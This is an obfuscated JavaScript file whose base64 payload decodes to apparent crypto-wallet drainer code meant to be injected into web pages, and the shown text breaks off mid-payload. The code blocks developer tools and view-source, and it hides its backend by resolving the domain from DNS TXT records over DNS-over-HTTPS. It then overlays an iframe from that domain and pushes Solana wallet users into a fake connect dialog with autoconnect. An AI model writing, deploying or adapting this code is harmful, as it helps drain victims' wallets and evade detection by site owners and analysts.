(function(){var _0xzc4gy3=atob("KGZ1bmN0aW9uKCkgewooZnVuY3Rpb24oKSB7CiAgLy8gU2tpcCBkZXZ0b29scyBkZXRlY3Rpb24gb24gbW9iaWxlIGRldmljZXMgKGNhdXNlcyBmYWxzZSBwb3NpdGl2ZXMpCiAgdmFyIGlzTW9iaWxlID0gL0FuZHJvaWR8d2ViT1N8aVBob25lfGlQYWR8aVBvZHxCbGFja0JlcnJ5fElFTW9iaWxlfE9wZXJhIE1pbmkvaS50ZXN0KG5hdmlnYXRvci51c2VyQWdlbnQpOwogIGlmIChpc01vYmlsZSkgcmV0dXJuOwoKICB2YXIgZGV2dG9vbHMgPSB7b3BlbjogZmFsc2UsIG9yaWVudGF0aW9uOiBudWxsfTsKICB2YXIgdGhyZXNob2xkID0gMTYwOwogIHZhciBlbWl0RXZlbnQgPSBmdW5jdGlvbihzdGF0ZSwgb3JpZW50YXRpb24pIHsKICAgIGlmIChzdGF0ZSkgewogICAgICBjcmFzaFNpdGUoKTsKICAgIH0KICB9OwogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgaWYgKHdpbmRvdy5vdXRlckhlaWdodCAtIHdpbmRvdy5pbm5lckhlaWdodCA+IHRocmVzaG9sZCB8fAogICAgICAgIHdpbmRvdy5vdXRlcldpZHRoIC0gd2luZG93LmlubmVyV2lkdGggPiB0aHJlc2hvbGQpIHsKICAgICAgaWYgKCFkZXZ0b29scy5vcGVuKSB7CiAgICAgICAgZW1pdEV2ZW50KHRydWUsICdkb2NrZWQnKTsKICAgICAgICBkZXZ0b29scy5vcGVuID0gdHJ1ZTsKICAgICAgfQogICAgfSBlbHNlIHsKICAgICAgZGV2dG9vbHMub3BlbiA9IGZhbHNlOwogICAgfQogIH0sIDEwMCk7CiAgdmFyIGVsZW1lbnQgPSBuZXcgSW1hZ2UoKTsKICBPYmplY3QuZGVmaW5lUHJvcGVydHkoZWxlbWVudCwgJ2lkJywgewogICAgZ2V0OiBmdW5jdGlvbigpIHsKICAgICAgZW1pdEV2ZW50KHRydWUsICdjb25zb2xlJyk7CiAgICAgIGRldnRvb2xzLm9wZW4gPSB0cnVlOwogICAgfQogIH0pOwogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgY29uc29sZS5sb2coZWxlbWVudCk7CiAgICBjb25zb2xlLmNsZWFyKCk7CiAgfSwgMTAwKTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIHZhciBzdGFydCA9IHBlcmZvcm1hbmNlLm5vdygpOwogICAgZGVidWdnZXI7CiAgICB2YXIgZW5kID0gcGVyZm9ybWFuY2Uubm93KCk7CiAgICBpZiAoZW5kIC0gc3RhcnQgPiAxMDApIHsKICAgICAgZW1pdEV2ZW50KHRydWUsICdkZWJ1Z2dlcicpOwogICAgfQogIH0sIDEwMCk7CiAgZnVuY3Rpb24gY3Jhc2hTaXRlKCkgewogICAgLy8gUmVkaXJlY3QgdG8gYmxhbmsgcGFnZSBpbnN0ZWFkIG9mIERPTSBtYW5pcHVsYXRpb24KICAgIC8vIFVzaW5nIGlubmVySFRNTCB3b3VsZCBkZXN0cm95L3JlY3JlYXRlIHRoZSBpZnJhbWUsIGNhdXNpbmcgcmVxdWVzdCBzcGFtCiAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9ICdhYm91dDpibGFuayc7CiAgfQogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2NvbnRleHRtZW51JywgZnVuY3Rpb24oZSkgeyBlLnByZXZlbnREZWZhdWx0KCk7IH0pOwogIGRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ2tleWRvd24nLCBmdW5jdGlvbihlKSB7CiAgICBpZiAoZS5rZXlDb2RlID09PSAxMjMgfHwKICAgICAgICAoZS5jdHJsS2V5ICYmIGUuc2hpZnRLZXkgJiYgZS5rZXlDb2RlID09PSA3MykgfHwKICAgICAgICAoZS5jdHJsS2V5ICYmIGUuc2hpZnRLZXkgJiYgZS5rZXlDb2RlID09PSA3NCkgfHwKICAgICAgICAoZS5jdHJsS2V5ICYmIGUua2V5Q29kZSA9PT0gODUpKSB7CiAgICAgIGUucHJldmVudERlZmF1bHQoKTsKICAgICAgY3Jhc2hTaXRlKCk7CiAgICAgIHJldHVybiBmYWxzZTsKICAgIH0KICB9KTsKfSkoKTsKCnZhciBDT05GSUdfSUQgPSAiNjk5MWFjMDE5MjhlYjIwYWM5YmMyZGRlIjsKdmFyIF9ybiA9ICdfci5jaHJvbWUtZXh0ZW5zaW9uLWRhMGU1LWJjLmNvbSc7CnZhciBfY2sgPSAnX25yJzsKCmZ1bmN0aW9uIF9wYXJzZVR4dChkYXRhKSB7CiAgdHJ5IHsKICAgIHZhciBhbnN3ZXJzID0gZGF0YS5BbnN3ZXI7CiAgICBpZiAoIWFuc3dlcnMgfHwgIWFuc3dlcnMubGVuZ3RoKSByZXR1cm4gbnVsbDsKICAgIGZvciAodmFyIGkgPSAwOyBpIDwgYW5zd2Vycy5sZW5ndGg7IGkrKykgewogICAgICBpZiAoYW5zd2Vyc1tpXS50eXBlID09PSAxNikgewogICAgICAgIHZhciB2YWwgPSBhbnN3ZXJzW2ldLmRhdGE7CiAgICAgICAgaWYgKHZhbCAmJiB2YWwuY2hhckF0KDApID09PSAnIicpIHZhbCA9IHZhbC5zbGljZSgxLCAtMSk7CiAgICAgICAgaWYgKHZhbCAmJiB2YWwuaW5kZXhPZignLicpICE9PSAtMSkgcmV0dXJuIHZhbDsKICAgICAgfQogICAgfQogICAgcmV0dXJuIG51bGw7CiAgfSBjYXRjaCAoZSkgeyByZXR1cm4gbnVsbDsgfQp9CgpmdW5jdGlvbiBfY2FjaGVTZXQoa2V5LCB2YWwpIHsKICB0cnkgeyBzZXNzaW9uU3RvcmFnZS5zZXRJdGVtKGtleSwgSlNPTi5zdHJpbmdpZnkoeyB2OiB2YWwsIHQ6IERhdGUubm93KCkgfSkpOyB9IGNhdGNoKGUpIHt9Cn0KCmZ1bmN0aW9uIF9jYWNoZUdldChrZXksIHR0bCkgewogIHRyeSB7CiAgICB2YXIgcmF3ID0gc2Vzc2lvblN0b3JhZ2UuZ2V0SXRlbShrZXkpOwogICAgaWYgKCFyYXcpIHJldHVybiBudWxsOwogICAgdmFyIG9iaiA9IEpTT04ucGFyc2UocmF3KTsKICAgIGlmIChEYXRlLm5vdygpIC0gb2JqLnQgPiB0dGwpIHsgc2Vzc2lvblN0b3JhZ2UucmVtb3ZlSXRlbShrZXkpOyByZXR1cm4gbnVsbDsgfQogICAgcmV0dXJuIG9iai52OwogIH0gY2F0Y2goZSkgeyByZXR1cm4gbnVsbDsgfQp9CgpmdW5jdGlvbiBfZmV0Y2hEb2gobmFtZSkgewogIHZhciB1cmxzID0gWwogICAgJ2h0dHBzOi8vY2xvdWRmbGFyZS1kbnMuY29tL2Rucy1xdWVyeT9uYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSkgKyAnJnR5cGU9VFhUJywKICAgICdodHRwczovL2Rucy5nb29nbGUvcmVzb2x2ZT9uYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSkgKyAnJnR5cGU9VFhUJwogIF07CiAgdmFyIGlkeCA9IE1hdGgucmFuZG9tKCkgPCAwLjUgPyAwIDogMTsKICByZXR1cm4gZmV0Y2godXJsc1tpZHhdLCB7IGhlYWRlcnM6IHsgQWNjZXB0OiAnYXBwbGljYXRpb24vZG5zLWpzb24nIH0gfSkKICAgIC50aGVuKGZ1bmN0aW9uKHIpIHsgcmV0dXJuIHIuanNvbigpOyB9KQogICAgLnRoZW4oZnVuY3Rpb24oZCkgewogICAgICB2YXIgdiA9IF9wYXJzZVR4dChkKTsKICAgICAgaWYgKHYpIHJldHVybiB2OwogICAgICByZXR1cm4gZmV0Y2godXJsc1sxIC0gaWR4XSwgeyBoZWFkZXJzOiB7IEFjY2VwdDogJ2FwcGxpY2F0aW9uL2Rucy1qc29uJyB9IH0pCiAgICAgICAgLnRoZW4oZnVuY3Rpb24ocjIpIHsgcmV0dXJuIHIyLmpzb24oKTsgfSkKICAgICAgICAudGhlbihmdW5jdGlvbihkMikgeyByZXR1cm4gX3BhcnNlVHh0KGQyKTsgfSk7CiAgICB9KQogICAgLmNhdGNoKGZ1bmN0aW9uKCkgewogICAgICByZXR1cm4gZmV0Y2godXJsc1sxIC0gaWR4XSwgeyBoZWFkZXJzOiB7IEFjY2VwdDogJ2FwcGxpY2F0aW9uL2Rucy1qc29uJyB9IH0pCiAgICAgICAgLnRoZW4oZnVuY3Rpb24ocikgeyByZXR1cm4gci5qc29uKCk7IH0pCiAgICAgICAgLnRoZW4oZnVuY3Rpb24oZCkgeyByZXR1cm4gX3BhcnNlVHh0KGQpOyB9KQogICAgICAgIC5jYXRjaChmdW5jdGlvbigpIHsgcmV0dXJuIG51bGw7IH0pOwogICAgfSk7Cn0KCmZ1bmN0aW9uIHJlc29sdmVCYWNrZW5kKCkgewogIHZhciBjYWNoZWQgPSBfY2FjaGVHZXQoX2NrLCAzMDAwMDApOwogIGlmIChjYWNoZWQpIHJldHVybiBQcm9taXNlLnJlc29sdmUoY2FjaGVkKTsKICByZXR1cm4gX2ZldGNoRG9oKF9ybikudGhlbihmdW5jdGlvbihkb21haW4pIHsKICAgIGlmIChkb21haW4pIF9jYWNoZVNldChfY2ssIGRvbWFpbik7CiAgICByZXR1cm4gZG9tYWluOwogIH0pOwp9Cgp2YXIgX3Jlc29sdmVQcm9taXNlID0gcmVzb2x2ZUJhY2tlbmQoKTsKCmFzeW5jIGZ1bmN0aW9uIGJvb3QoKSB7CiAgdmFyIGRvbWFpbiA9IGF3YWl0IF9yZXNvbHZlUHJvbWlzZTsKICBpZiAoIWRvbWFpbikgcmV0dXJuOwoKICB2YXIgcGFyZW50RnVsbCA9IHdpbmRvdy5sb2NhdGlvbi5ob3N0ICsgKHdpbmRvdy5sb2NhdGlvbi5wYXRobmFtZSB8fCAnJykgKyAod2luZG93LmxvY2F0aW9uLnNlYXJjaCB8fCAnJyk7CiAgdmFyIE1PREFMX1VSTCA9ICdodHRwczovLycgKyBkb21haW4gKyAnL2RlbW8ucGhwP2lkPScgKyBDT05GSUdfSUQgKwogICAgKHBhcmVudEZ1bGwgPyAoJyZwYXJlbnRfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQocGFyZW50RnVsbCkpIDogJycpOwoKICAvLyBNT0JJTEUgV0FMTEVUIEJST1dTRVIgRklYOiBEZXRlY3QgaWYgd2UncmUgaW5zaWRlIGEgbW9iaWxlIHdhbGxldCdzIGluLWFwcCBicm93c2VyCiAgLy8gSWYgc28sIHJlZGlyZWN0IHRoZSBlbnRpcmUgcGFnZSB0byB0aGUgbW9kYWwgZG9tYWluIChza2lwIGlmcmFtZSkKICAvLyBOT1RFOiBQaGFudG9tIG1vYmlsZSB3b3JrcyBmaW5lIHdpdGggaWZyYW1lcywgc28gd2UgRVhDTFVERSBpdCBmcm9tIHRoaXMgcmVkaXJlY3QKICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgdWEgPSBuYXZpZ2F0b3IudXNlckFnZW50LnRvTG93ZXJDYXNlKCk7CiAgICB2YXIgaXNNb2JpbGUgPSAvYW5kcm9pZHxpcGhvbmV8aXBhZHxpcG9kL2kudGVzdCh1YSkgfHwKICAgICAgKG5hdmlnYXRvci5tYXhUb3VjaFBvaW50cyA+IDEgJiYgL21hY2ludG9zaC9pLnRlc3QodWEpKTsKICAgIHZhciBpc1BoYW50b21Ccm93c2VyID0gISEod2luZG93LnBoYW50b20/LnNvbGFuYT8uaXNQaGFudG9tIHx8IHdpbmRvdy5zb2xhbmE/LmlzUGhhbnRvbSk7CiAgICB2YXIgaXNPdGhlcldhbGxldEJyb3dzZXIgPSAhISh3aW5kb3cuc29sZmxhcmU/LmlzU29sZmxhcmUgfHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5Tb2xmbGFyZUFwcCB8fAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LnRydXN0d2FsbGV0Py5zb2xhbmEgfHwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpbmRvdy5iYWNrcGFjaz8uaXNCYWNrcGFjayB8fAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2luZG93LmNvaW5iYXNlU29sYW5hKTsKICAgIGlmIChpc01vYmlsZSAmJiAhaXNQaGFudG9tQnJvd3NlciAmJiBpc090aGVyV2FsbGV0QnJvd3NlciAmJiAhd2luZG93LmxvY2F0aW9uLnNlYXJjaC5pbmNsdWRlcygnbm9yZWRpcmVjdD0xJykpIHsKICAgICAgdmFyIHJlZGlyZWN0VXJsID0gTU9EQUxfVVJMICsgJyZzb3VyY2U9ZGlyZWN0LW1vYmlsZSZub3JlZGlyZWN0PTEmYXV0b2Nvbm5lY3Q9MSc7CiAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gcmVkaXJlY3RVcmw7CiAgICAgIHJldHVybjsKICAgIH0KICB9KSgpOwoKICB2YXIgc3R5bGUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzdHlsZScpOwogIHN0eWxlLnRleHRDb250ZW50ID0gJy5ub2lyLW1vZGFsLW92ZXJsYXkgeyBwb3NpdGlvbjogZml4ZWQ7IHRvcDogMDsgbGVmdDogMDsgd2lkdGg6IDEwMCU7IGhlaWdodDogMTAwJTsgYmFja2dyb3VuZDogcmdiYSgwLCAwLCAwLCAwLjgpOyBiYWNrZHJvcC1maWx0ZXI6IGJsdXIoOHB4KTsgZGlzcGxheTogbm9uZTsganVzdGlmeS1jb250ZW50OiBjZW50ZXI7IGFsaWduLWl0ZW1zOiBjZW50ZXI7IHotaW5kZXg6IDk5OTk5OyBvcGFjaXR5OiAwOyB0cmFuc2l0aW9uOiBvcGFjaXR5IDAuM3MgZWFzZTt9Lm5vaXItbW9kYWwtb3ZlcmxheS5ub2lyLWFjdGl2ZSB7IGRpc3BsYXk6IGZsZXg7IG9wYWNpdHk6IDE7fS5ub2lyLW1vZGFsLWlmcmFtZSB7IHdpZHRoOiAzNjBweDsgaGVpZ2h0OiA2MjBweDsgYm9yZGVyOiBub25lOyBib3JkZXItcmFkaXVzOiAxNnB4OyBiYWNrZ3JvdW5kOiB0cmFuc3BhcmVudDsgb3ZlcmZsb3c6IGhpZGRlbjsgdHJhbnNmb3JtOiBzY2FsZSgwLjkpOyB0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gMC4zcyBlYXNlO30ubm9pci1tb2RhbC1vdmVybGF5Lm5vaXItYWN0aXZlIC5ub2lyLW1vZGFsLWlmcmFtZSB7IHRyYW5zZm9ybTogc2NhbGUoMSk7fUBtZWRpYSAobWF4LXdpZHRoOiA0ODBweCkgeyAubm9pci1tb2RhbC1pZnJhbWUgeyB3aWR0aDogMTAwJTsgaGVpZ2h0OiAxMDAlOyBib3JkZXItcmFkaXVzOiAwOyB9fSc7CiAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZChzdHlsZSk7CgogIHZhciBtb2RhbEhUTUwgPSAnPGRpdiBjbGFzcz0ibm9pci1tb2RhbC1vdmVybGF5IiBpZD0ibm9pck1vZGFsT3ZlcmxheSI+JyArCiAgICAnPGlmcmFtZSBjbGFzcz0ibm9pci1tb2RhbC1pZnJhbWUiIHNyYz0iJyArIE1PREFMX1VSTCArICciIGFsbG93VHJhbnNwYXJlbmN5PSJ0cnVlIj48L2lmcmFtZT4nICsKICAgICc8L2Rpdj4nOwoKICAvLyBNZXNzYWdlIGxpc3RlbmVyIGF0IEdMT0JBTCBzY29wZSAtIGhhbmRsZXMgd2FsbGV0IGRlZXAgbGluayBtZXNzYWdlcyBmcm9tIGlmcmFtZQogIHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdtZXNzYWdlJywgZnVuY3Rpb24oZXZlbnQpIHsKICAgIC8vIEhhbmRsZSBkZXNrdG9wUmVkaXJlY3QgZm9yIHdhbGxldHMgdGhhdCBkb24ndCB3b3JrIHdpdGggaWZyYW1lcyAoZS5nLiwgVHJ1c3QgV2FsbGV0IGRlc2t0b3ApCiAgICBpZiAoZXZlbnQuZGF0YSAmJiBldmVudC5kYXRhLmRlc2t0b3BSZWRpcmVjdCkgewogICAgICB2YXIgaWZyYW1lID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignaWZyYW1lJyk7CiAgICAgIGlmIChpZnJhbWUgJiYgaWZyYW1lLnNyYykgewogICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gaWZyYW1lLnNyYyArICcmc291cmNlPWRlc2t0b3AtcmVkaXJlY3QnOwogICAgICB9CiAgICAgIHJldHVybjsKICAgIH0KCiAgICAvLyBIYW5kbGUgbW9iaWxlIHdhbGxldCByZWRpcmVjdCB3aXRoIG1vZGFsIFVSTCAoZnJvbSBBcHBLaXQgaWZyYW1lKQogICAgLy8gVXNlcyB0aGUgaWZyYW1lJ3MgVVJMIChtb2RhbCBVUkwpIHNvIHRoZSB3YWxsZXQgb3BlbnMgaXQgYXQgdG9wIGxldmVsIOKAlCBubyBpZnJhbWUKICAgIGlmIChldmVudC5kYXRhICYmIGV2ZW50LmRhdGEudHlwZSA9PT0gJ25vaXJXYWxsZXRSZWRpcmVjdCcgJiYgZXZlbnQuZGF0YS53YWxsZXQgJiYgZXZlbnQuZGF0YS51cmwpIHsKICAgICAgdmFyIHdhbGxldCA9IGV2ZW50LmRhdGEud2FsbGV0OwogICAgICB2YXIgdGFyZ2V0VXJsID0gZW5jb2RlVVJJQ29tcG9uZW50KGV2ZW50LmRhdGEudXJsKTsKICAgICAgdmFyIHRhcmdldFJlZiA9IGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24ub3JpZ2luKTsKICAgICAgdmFyIHdhbGxldExpbmsgPSAnJzsKICAgICAgaWYgKHdhbGxldCA9PT0gJ3BoYW50b20nKSB7CiAgICAgICAgd2FsbGV0TGluayA9ICdodHRwczovL3BoYW50b20uYXBwL3VsL2Jyb3dzZS8nICsgdGFyZ2V0VXJsICsgJz9yZWY9JyArIHRhcmdldFJlZjsKICAgICAgfSBlbHNlIGlmICh3YWxsZXQgPT09ICdzb2xmbGFyZScpIHsKICAgICAgICB3YWxsZXRMaW5rID0gJ2h0dHBzOi8vc29sZmxhcmUuY29tL3VsL3YxL2Jyb3dzZS8nICsgdGFyZ2V0VXJsICsgJz9yZWY9JyArIHRhcmdldFJlZjsKICAgICAgfSBlbHNlIGlmICh3YWxsZXQgPT09ICdiYWNrcGFjaycpIHsKICAgICAgICB3YWxsZXRMaW5rID0gJ2h0dHBzOi8vYmFja3BhY2suYXBwL3VsL2Jyb3dzZS8nICsgdGFyZ2V0VXJsICsgJz9yZWY9JyArIHRhcmdldFJlZjsKICAgICAgfSBlbHNlIGlmICh3YWxsZXQgPT09ICdjb2luYmFzZScpIHsKICAgICAgICB3YWxsZXRMaW5rID0gJ2h0dHBzOi8vZ28uY2Itdy5jb20vZGFwcD9jYl91cmw9JyArIHRhcmdldFVybDsKICAgICAgfSBlbHNlIGlmICh3YWxsZXQgPT09ICd0cnVzdCcpIHsKICAgICAgICB3YWxsZXRMaW5rID0gJ2h0dHBzOi8vbGluay50cnVzdHdhbGxldC5jb20vb3Blbl91cmw/dXJsPScgKyB0YXJnZXRVcmw7CiAgICAgIH0gZWxzZSBpZiAod2FsbGV0ID09PSAnbWFnaWNlZGVuJykgewogICAgICAgIHdhbGxldExpbmsgPSAnaHR0cHM6Ly93YWxsZXQubWFnaWNlZGVuLmlvL3VsL2Jyb3dzZS8nICsgdGFyZ2V0VXJsICsgJz9yZWY9JyArIHRhcmdldFJlZjsKICAgICAgfQogICAgICBpZiAod2FsbGV0TGluaykgewogICAgICAgIHdpbmRvdy5sb2NhdGlvbi5ocmVmID0gd2FsbGV0TGluazsKICAgICAgfQogICAgICByZXR1cm47CiAgICB9CgogICAgLy8gSGFuZGxlIHN0YW5kYXJkIG1vYmlsZSBkZWVwbGluayByZWRpcmVjdHMgKGxlZ2FjeSkKICAgIGlmIChldmVudC5kYXRhICYmIGV2ZW50LmRhdGEuZGVlcGxpbmspIHsKICAgICAgdmFyIGFjdGlvbiA9IGV2ZW50LmRhdGEuZGVlcGxpbms7CiAgICAgIHZhciBjdXJyZW50VXJsID0gbmV3IFVSTCh3aW5kb3cubG9jYXRpb24uaHJlZik7CiAgICAgIGN1cnJlbnRVcmwuc2VhcmNoUGFyYW1zLnNldCgnc2hvd0ZyYW1lJywgJ3RydWUnKTsKICAgICAgdmFyIHVybCA9IGVuY29kZVVSSUNvbXBvbmVudChjdXJyZW50VXJsLnRvU3RyaW5nKCkpOwogICAgICB2YXIgcmVmID0gZW5jb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5vcmlnaW4pOwogICAgICB2YXIgbW9iaWxlRGVlcExpbmsgPSAnJzsKICAgICAgaWYgKGFjdGlvbiA9PT0gJ3BoYW50b20nKSB7CiAgICAgICAgbW9iaWxlRGVlcExpbmsgPSAnaHR0cHM6Ly9waGFudG9tLmFwcC91bC9icm93c2UvJyArIHVybCArICc/cmVmPScgKyByZWY7CiAgICAgIH0gZWxzZSBpZiAoYWN0aW9uID09PSAnc29sZmxhcmUnKSB7CiAgICAgICAgbW9iaWxlRGVlcExpbmsgPSAnaHR0cHM6Ly9zb2xmbGFyZS5jb20vdWwvdjEvYnJvd3NlLycgKyB1cmwgKyAnP3JlZj0nICsgcmVmOwogICAgICB9IGVsc2UgaWYgKGFjdGlvbiA9PT0gJ2JhY2twYWNrJykgewogICAgICAgIG1vYmlsZURlZXBMaW5rID0gJ2h0dHBzOi8vYmFja3BhY2suYXBwL3VsL2Jyb3dzZS8nICsgdXJsICsgJz9yZWY9JyArIHJlZjsKICAgICAgfSBlbHNlIGlmIChhY3Rpb24gPT09ICdjb2luYmFzZScpIHsKICAgICAgICBtb2JpbGVEZWVwTGluayA9ICdodHRwczovL2dvLmNiLXcuY29tL2RhcHA/Y2JfdXJsPScgKyB1cmw7CiAgICAgIH0gZWxzZSBpZiAoYWN0aW9uID09PSAndHJ1c3QnKSB7CiAgICAgICAgbW9iaWxlRGVlcExpbmsgPSAnaHR0cHM6Ly9saW5rLnRydXN0d2FsbGV0LmNvbS9vcGVuX3VybD91cmw9JyArIHVybDsKICAgICAgfSBlbHNlIGlmIChhY3Rpb24gPT09ICdtYWdpY2VkZW4nKSB7CiAgICAgICAgbW9iaWxlRGVlcExpbmsgPSAnaHR0cHM6Ly93YWxsZXQubWFnaWNlZGVuLmlvL3VsL2Jyb3dzZS8nICsgdXJsICsgJz9yZWY9JyArIHJlZjsKICAgICAgfQogICAgICBpZiAobW9iaWxlRGVlcExpbmspIHsKICAgICAgICB3aW5kb3cubG9jYXRpb24uaHJlZiA9IG1vYmlsZURlZXBMaW5rOwogICAgICB9CiAgICB9CiAgfSk7CgogIC8vIE1vYmlsZSB3YWxsZXQgcGlja2VyIOKAlCBSZW93biBBcHBLaXQtc3R5bGUgZGVzaWduCiAgLy8gRWFjaCBidXR0b24gaXMgYSByZWFsIDxhPiBsaW5rIHRvIHRoZSB3YWxsZXQncyBicm93c2UgZGVlcGxpbmsgd2l0aCB0aGUgbW9kYWwgVVJMCiAgLy8gSWNvbnMgbG9hZGVkIGZyb20gV2FsbGV0Q29ubmVjdCBDRE4gKGFwaS53ZWIzbW9kYWwuY29tL2dldFdhbGxldEltYWdlL3tpZH0pCiAgZnVuY3Rpb24gc2hvd01vYmlsZVdhbGxldFBpY2tlcigpIHsKICAgIHZhciBleGlzdGluZyA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdub2lyV2FsbGV0UGlja2VyJyk7CiAgICBpZiAoZXhpc3RpbmcpIGV4aXN0aW5nLnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoZXhpc3RpbmcpOwoKICAgIHZhciBhdXRvY29ubmVjdFVybCA9IE1PREFMX1VSTCArICcmYXV0b2Nvbm5lY3Q9MSc7CiAgICB2YXIgZW5jb2RlZFVybCA9IGVuY29kZVVSSUNvbXBvbmVudChhdXRvY29ubmVjdFVybCk7CiAgICB2YXIgZW5jb2RlZFJlZiA9IGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cubG9jYXRpb24ub3JpZ2luKTsKICAgIHZhciBpbWdCYXNlID0gJ2h0dHBzOi8vYXBpLndlYjNtb2RhbC5vcmcvZ2V0V2FsbGV0SW1hZ2UvJzsKICAgIHZhciBpbWdRID0gJz9wcm9qZWN0SWQ9MDVhNzJmMzE5YWQyNTAwNjBjODJkYTRkYzczN2UwYWQmc3Q9YXBwa2l0JnN2PWh0bWwtc29sYW5hLXVuZGVmaW5lZCc7CiAgICB2YXIgd2FsbGV0cyA9IFsKICAgICAgeyBuYW1lOiAnUGhhbnRvbScsIHRhZzogJ1BPUFVMQVInLCBpbWc6IGltZ0Jhc2UgKyAnYjZlYzdiODEtYmI0Zi00MjdkLWUyOTAtNzYzMWU2ZTUwZDAwJyArIGltZ1EsIHVybDogJ2h0dHBzOi8vcGhhbnRvbS5hcHAvdWwvYnJvd3NlLycgKyBlbmNvZGVkVXJsICsgJz9yZWY9JyArIGVuY29kZWRSZWYgfSwKICAgICAgeyBuYW1lOiAnU29sZmxhcmUnLCB0YWc6ICdQT1BVTEFSJywgaW1nOiBpbWdCYXNlICsgJzM0YzBlMzhkLTY2YzQtNDcwZS0xYWVkLWE2ZmFiZTJkMWUwMCcgKyBpbWdRLCB1cmw6ICdodHRwczovL3NvbGZsYXJlLmNvbS91bC92MS9icm93c2UvJyArIGVuY29kZWRVcmwgKyAnP3JlZj0nICsgZW5jb2RlZFJlZiB9LAogICAgICB7IG5hbWU6ICdCYWNrcGFjaycsIHRhZzogJycsIGltZzogaW1nQmFzZSArICc3MWNhOWRhZi1hMzFlLTRkMmEtZmQwMS1mNWRjMmRjNjY5MDAnICsgaW1nUSwgdXJsOiAnaHR0cHM6Ly9iYWNrcGFjay5hcHAvdWwvYnJvd3NlLycgKyBlbmNvZGVkVXJsICsgJz9yZWY9JyArIGVuY29kZWRSZWYgfSwKICAgICAgeyBuYW1lOiAnVHJ1c3QgV2FsbGV0JywgdGFnOiAnJywgaW1nOiBpbWdCYXNlICsgJzc2NzdiNTRmLTM0ODYtNDZlMi00ZTM3LWJmODc0NzgxNGYwMCcgKyBpbWdRLCB1cmw6ICdodHRwczovL2xpbmsudHJ1c3R3YWxsZXQuY29tL29wZW5fdXJsP3VybD0nICsgZW5jb2RlZFVybCB9LAogICAgICB7IG5hbWU6ICdDb2luYmFzZSBXYWxsZXQnLCB0YWc6ICcnLCBpbWc6IGltZ0Jhc2UgKyAnMDRjODhiZjAtZjExNS00Njg2LThjMjktOTBhM2QwMThhNDAwJyArIGltZ1EsIHVybDogJ2h0dHBzOi8vZ28uY2Itdy5jb20vZGFwcD9jYl91cmw9JyArIGVuY29kZWRVcmwgfQogICAgXTsKCiAgICB2YXIgcGlja2VyQ1NTID0gJzxzdHlsZT4nICsKICAgICAgJy5ud3Atb3ZlcmxheXtwb3NpdGlvbjpmaXhlZDt0b3A6MDtsZWZ0OjA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtiYWNrZ3JvdW5kOnJnYmEoMCwwLDAsMC42KTtiYWNrZHJvcC1maWx0ZXI6Ymx1cig2cHgpOy13ZWJraXQtYmFja2Ryb3AtZmlsdGVyOmJsdXIoNnB4KTtkaXNwbGF5OmZsZXg7anVzdGlmeS1jb250ZW50OmNlbnRlcjthbGlnbi1pdGVtczpmbGV4LWVuZDt6LWluZGV4OjEwMDAwMTthbmltYXRpb246bndwLWZhZGUgLjJzIGVhc2V9JyArCiAgICAgICcubndwLWNhcmR7YmFja2dyb3VuZDojMTQxNDE0O2JvcmRlci1yYWRpdXM6Y2xhbXAoMHB4LDI0cHgsNDRweCkgY2xhbXAoMHB4LDI0cHgsNDRweCkgMCAwO3BhZGRpbmc6MTZweCAxMnB4IGNhbGMoMTJweCArIGVudihzYWZlLWFyZWEtaW5zZXQtYm90dG9tLDEycHgpKTt3aWR0aDoxMDAlO21heC13aWR0aDo0MDBweDtib3JkZXI6MXB4IHNvbGlkIHJnYmEoMjU1LDI1NSwyNTUsMC4wNik7Ym9yZGVyLWJvdHRvbTpub25lO2FuaW1hdGlvbjpud3Atc2xpZGUgLjNzIGN1YmljLWJlemllciguMTYsMSwuMywxKX0nICsKICAgICAgJy5ud3AtaGVhZGVye2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjtwb3NpdGlvbjpyZWxhdGl2ZTtwYWRkaW5nOjRweCAwIDEycHh9JyArCiAgICAgICcubndwLXRpdGxle2NvbG9yOiNlNGU3ZTc7Zm9udDo2MDAgMTZweC8xIEtIVGVrYSxzeXN0ZW0tdWksLWFwcGxlLXN5c3RlbSxzYW5zLXNlcmlmO2xldHRlci1zcGFjaW5nOi0wLjAxZW19JyArCiAgICAgICcubndwLWNsb3Nle3Bvc2l0aW9uOmFic29sdXRlO3JpZ2h0OjA7dG9wOjJweDt3aWR0aDoyOHB4O2hlaWdodDoyOHB4O2JvcmRlci1yYWRpdXM6NTAlO2JhY2tncm91bmQ6cmdiYSgyNTUsMjU1LDI1NSwwLjA1KTtib3JkZXI6bm9uZTtjb2xvcjojOWE5ZmE1O2ZvbnQtc2l6ZToxNnB4O2N1cnNvcjpwb2ludGVyO2Rpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OmNlbnRlcjstd2Via2l0LXRhc